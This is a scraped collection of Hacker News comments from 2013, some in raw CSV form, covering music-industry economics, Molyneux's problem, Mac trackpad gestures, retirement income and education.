I realized that it was probably pulling the longest content on the page. Looking at the source code, that's exactly what it does. It removes forms, objects, scripts, images, blank links, divs, etc. Then it goes through paragraphs and tables and finds the longest content. This algorithm seems pretty good for long-form article content, but not for the marketing homepage I tried it on. Overall, pretty cool.",1367110782

There was quite a crowd around them, and their music was good. They had a suitcase open in front of them, with what looked like a couple hundred bucks in it, a stack of CDs, and a sign that said the CDs were $15 each.<p>It's likely they 'salted' the suitcase with cash, but even so, it looked like they made some decent cash for a couple hours work.<p>I bought one, and really enjoy it.

If you did, I'd be able to make use of it. (I'm 38 and definitely not ""starting out"".) It appears that you're making the assumption that the ""Returns per Year"" percentage input should also be used when figuring monthly income. I disagree with that. I'm comfortable guessing at a relatively high (7 or 8%) annual return on investment while building my savings, which would be derived from a combination of dividend income and capital gains. But, when it comes to living on a fixed income, I'm tempted to guess at a lower annual return (4% - dividend income only) because the negative consequences of being wrong are fairly high. My two cents.",1367110674

5619713,comment,5619261,5619499,4,0,javert,,,"Because one of the fundamental questions in philosophy has always been whether knowledge comes from empirical sense experience or whether it comes from somewhere else.<p>Having a definitive answer to this question could be thought to potentially shed light on that.<p>Plato would probably argue that shape concepts are innately available to consciousness, and that when the blind person touches a sphere (for example), he connects that with his innate conception of a sphere. So Plato probably would have expected the suddenly non-blind person to be able to immediately connect his tactile experience of a sphere with his visual experience of a sphere.<p>British empiricist philosophers would probably have argued along the lines that there is no such thing as an internal conception of a sphere. So they would disagree with Plato.<p>Of course, the true answer is that neither Plato's team nor the empiricists were completely right. There are concepts, but they are formed based on sense data, not based on some kind of innate knowledge.",1367110509

I have a MacBook Pro for personal use, and at work I'm a Java developer using an iMac with a Magic Trackpad.<p>I don't use all the gestures, just a few of them. But I've been doing it for so long they're second nature to me.<p>Two finger scroll one of the most important. I remember trying to use friend's PCs before it became common and being frustrated every time.<p>Two finger click works like a right-click, so I don't need to hold a key or dedicate part of my touchpad to right-clicking.<p>Three finger swipe left/right is <i>amazing</i>. It functions as a forward/backward gesture. In Safari it moves through history. In IntelliJ (my IDE of choice) it does the same thing, which is <i>invaluable</i>. I don't even know the keyboard shortcut in IntelliJ, it just works. And it works in Chrome. And Xcode. Having a universal gesture is fantastic.<p>Another favorite is four fingers up, which activates Expose. When you're moving between multiple applications and copying & pasting it makes makes things so much easier. I don't have to move my hand off command-C/V.<p>Four finger spread shows the desktop, which I use occasionally.<p>Double-tap with two fingers zooms in iOS style in Safari, which can e useful<p>Double-tap with three fingers opens the dictionary (& Wikipedia!) <i>anywhere in the os</i> on whatever you tap on. Reading an article and don't know what something is? Just double-tap three fingers and a little pop-up tells you. It's one of those functions that's always been there but it's so easy to get to I actually use it now.<p>That's what I use. There are a few more. Four fingers together opens Launcher. In Safari the zoom out gesture (pinch two fingers) brings up a tab-list, but I keep forgetting that's there since it's a relatively recent add. Four fingers down is Expose for one application, but I don't have much need for that. Two fingers from the right edge opens the notifications in Mountain Lion (which I don't really use).<p>If you're a multi-desktop person, four fingers left or right switches between desktops (including Dashboard) and every full screen application. This also works for app switching on iPad 2/3/4s.<p>Really it's like using command-c/v to copy and paste or command-tab to switch applications. It's quick and easy to do, and you quickly forget it's there and start doing it automatically.<p>Honestly I hate helping coworkers with a problem in IntellJ because they all use normal mice and I can't easily jump back to the last place I did an edit (even in another file). I'm working on helping them and then all of a sudden there is a brain stall while I realize that I can't just do a swipe and have to think to go click on the tab I want.<p>I feel handicapped without them; like something is missing. I remember how much I liked getting a button on the side of my MS IntelliMouse I could use to go back when surfing, this is like 100x that.<p>Edit: It just occurred to me that these aren't default gestures. A few of them changed in Mountain Lion and I set my Macs back to the way Lion had them, so you may have to experiment.",1367110325

5619694,comment,5619261,5619261,6,0,kcl,,,"With respect to Molyneux and Locke, while I believe they get the general idea right, I believe they get the actual answer wrong. The answer to Molyneux's problem should be ""yes"" --- the newly sighted can correctly associate the shapes.<p>A sufficiently educated and intelligent person with congenital blindness would be able to correctly differentiate the shapes. Say, for instance, had Locke been born blind and still educated as rigorously. Of the many deductions that could be performed, the motion of the head with eyes fixed looking around the border of an object in space approximates the motion of the hand tracing the same object. Many other deductions are possible. All you need are reasonable assumptions about the acclimatization process, e.g., the patient can have a suitable amount of time to adjust to being sighted but cannot touch anything during the process.<p>It is fascinating to think about the idea of disconnected senses, but as so commonly happens, fascination with an idea leads to sloppy thinking, especially among the educated.<p>The reason why the empirical studies of the patients from India are wrong, despite being interpreted as giving a concurring answer, is that the blind have traditionally been given feeble educations, lacking in the type of rigorous thinking necessary to solve the problem. Historically it was challenging to teach abstract reasoning to the blind, and for this reason many were not taught. See Herzog's documentary ""Handicapped Future"" for tragic examples in relatively wealthy 1960s West Germany. <a href=""http://en.wikipedia.org/wiki/Handicapped_Future"" rel=""nofollow"">http://en.wikipedia.org/wiki/Handicapped_Future</a><p>The five patients in India who could not afford simple but life-altering surgery were sure to be poor in addition to being blind, and so surely must have received awful educations. Compounding this are their young ages.<p>A sufficiently motivated, newly-sighted Locke would've gotten the answer correct.",1367110098

At least, until they no longer hold your interest.<p>There is a certain anxiety that comes when you know you have to do something you really don't want to do.  For example, a class holds no interest, you know what needs to be done but you have no inclination to do it, so you don't.  Besides you can always do it later and later sounds great.  The deadline draws near and you must complete tasks (final projects, prepare for the exam, etc) or risk taking the class over again.  You know you need to perform but you just can't bring yourself to do it.  The anxiety of missing the deadline sets in and the thought of doing something over again that you detested doing in the first place begins to eat away at you.  The tasks really aren't all that difficult or time-consuming.  The real barrier to success is just you and your own stubborn will.  Now there's anguish from the self-inflicted pain.

And so if Spotify makes a profit then the major labels can just renegotiate their contracts within a year (they typically have break clauses), and gobble up all those extra earnings.<p>You see the music business is a /nightmarish/ labyrinth of copyright legislation, so to even start playing in this game you need a staff lawyer (or three). There's recording rights, which you have to pay to one arm of the label. Then there's publishing rights, which you have to pay to a completely different arm of the label (or, if you're unlucky, a different label - like with the erstwhile EMI's catalogue), and that's just to play some radio. If you want to do on-demand streaming, of the type that Spotify provides, then you have to pay mechanical reproduction royalties. Whaaa? I hear you say. Well, it takes a while for the law to catch up with these things so they've just repurposed the laws that were already there. Would you believe, you even have a different bunch of people to pay if you want to reproduce the lyrics. Now, take all that and multiply it by the number of countries you want to stream in, because you're gonna need to strike deal with a different branch of each label in each country. It's insanity.<p>The one beacon of light is the much maligned DMCA act, which (aside for enabling content owners to persecute twelve year old children) allows those wanting to stream music in a radio-like fashion to just pay a central collections agency a fixed rate. That simplifies the business significantly - no more negotiation and complex contracts, and no more need to have such detailed reporting (less staff, less code). The only thing is that it's applicable only in the US, as there's no EU equivalent (or anywhere else, for that matter). And it doesn't cover on-demand streaming. But it's a start.<p>Music startups really need to push for an overhaul of the copyright laws because the landscape has fundamentally changed and what exists currently is both arcane and archaic. We need a complete legislative metamorphosis, lest the major labels continue to move their contractual blessing between startups - ideally, of course, shortly after a tasty IPO - which all resembles the classic pump-and-dump scam.<p>I hope it happens.<p>[1] <a href=""http://techcrunch.com/2012/11/10/spotify-is-having-a-good-2012-revenues-could-reach-500m-as-it-expands-the-digital-music-market/"" rel=""nofollow"">http://techcrunch.com/2012/11/10/spotify-is-having-a-good-20...</a>",1367109428

5619654,comment,5619186,5619524,6,0,tunesmith,,,"Here's what performing live is actually like for indie musicians.  You do some open mics where people are talking to their friends or facing the bar, turning to clap perfunctorily.  The sound is crap and people can't understand the lyrics.  Move on to showcases and shared gigs - the sound is still usually bad but you get more time.  The audience is chiefly the other musicians and their friends.  Occasionally you'll get a good gig with actual audience members - if you have your cd with you, selling 10-15 cds is a great night.  If you have a band, you book some time at a venue where several other bands are playing, the ""headliners"" playing after midnight after a lot of the crowd goes home.  The band might split ten to fifteen bucks between them.  (Jazz players tend to make more at their gigging at $50/head.)  Touring is finding other friends in other nearby towns to share a gig with - if you have been around for a while and have 2-3 cds to your name you might be able to get an announcement in the paper, and you can sell some cds but if you get a hotel, that plus the gas money means you're in the hole.  If you're doing <i>well</i>, with a name and a track record, you can get paid a few hundred bucks or maybe break a grand for the occasional big events.  Still not generally as much as you'd get if you were a cover band at a wedding.  If you're younger and go on tours with your friends, sharing beds and floor space in Motel 6's and trying to get on to the college circuit, a successful tour is where you take a couple of weeks of vacation from your real job and <i>break even</i>.<p>I know it's common for people to believe that these days the secret is to use the recording as a marketing expense for touring (""where the real money is"") but it is a myth.  Yes, there exist groups that make good money touring, but even among groups with good music and good recordings, they are the exception more than the rule.  The musicians that I know that are paying their way as a musician are invariably also doing things like pit musician work in theatrical productions, or teaching... or a bit of graphic design work for other musicians, while convincing themselves they're earning that money as a musician... - and they're generally not saving for retirement or paying for health insurance.<p>Also, I think there's this common belief that if musicians give their music away for free, they will get this massive visibility bonus that will translate into significant monetization.  I think that's a myth, too.  From a consumer's perspective, if a musician is giving away their music for free, it's not valued.  And there are a <i>lot</i> of musicians trying to give their music away for free.  In that approach, you have a hard enough time getting people to listen in the first place, let alone come to a determination of whether it's good or not.<p>Anyway, I don't have music career goals.  (In my case, it'd be silly, since I have a successful programming freelance career.)  What would be great, over time, is if my music habit paid for itself largely from recordings, maybe $10k a year and enough time to release a cd every year.  Not in the cards for this release unless I sell out, reprint, and make good money on the digital side.  Maybe a few cds from now things will snowball a bit.",1367109286
5619653,comment,5619186,5619186,2,0,Spendar89,,,"I think a relevant issue that is the direct result of spotify/pandora/itunes is that we no longer consume albums,  but rather individual tracks.  Artists used to (and many still do) value producing a collection of songs that when listened sequentially meant something much more than listening to each song individually.  Therefore, albums should theoretically be worth significantly more than the sum of the value of each individual track, but today's services have essentially destroyed this model.  Don't get me wrong, there are obvious benefits of being able to consume only the tracks you like most, and I understand that we can still choose to listen to albums in their entirety, but the vast majority of people do not. A serious consequence of this is that consumers value music and the music industry as a whole significantly less than they once did.  I also think there is an opportunity within the music-tech space to recreate the album-listening experience in an elegant way.",1367109279

The uptick would be more interesting if they announced it in a months time or in an even longer period of time.\nThere are several reasons for this including, the perception of X has acquired them and theyre a massive company which means that the service will be around for a while (which is not necessarily true) and the fact that, the acquired company gets a lot of press from areas they may previously not have done so they get new users either as customers or simply joining to look at the service  although they may not become actual valuable users  by those I mean look at the service, Im talking about other employees of the acquiring company, shareholders of the acquiring company etc.",1367108478

In fact, I've always been of the opinion that the institutionalization of learning works to the detriment of education and discourages most students from learning on their own, while doing an incompetent job of equipping them with knowledge of value. Schools ought to place greater emphasis on technical skills, applied math, nonfiction writing and modern government/geopolitics; and less on lab science, academic math, literature and classical history. It's not that the classical academic subjects lack intelectual value, but that public schools ought to serve a purely pragmatic purpose. The current system is, in my opinion, exceedingly ineffective and even detrimental to students who are deterred by what they perceive as pedantic material. They determine that they don't like school (particularly math), adopt defeatist attitudes and, by the end of high school, are entirely unequipped to enter the workforce or to matriculate into post-secondary programs.<p>Also, I'm curious as to when you attended school and which APs you took.

Those who are blind from birth simply never developed the ability to form abstract representations from visual stimuli, therefore haptic information cannot be translated into these visual representations. The other commenters who are saying there is no pathway between the two modalities are wrong, and it's easy to set up an experiment to show it.
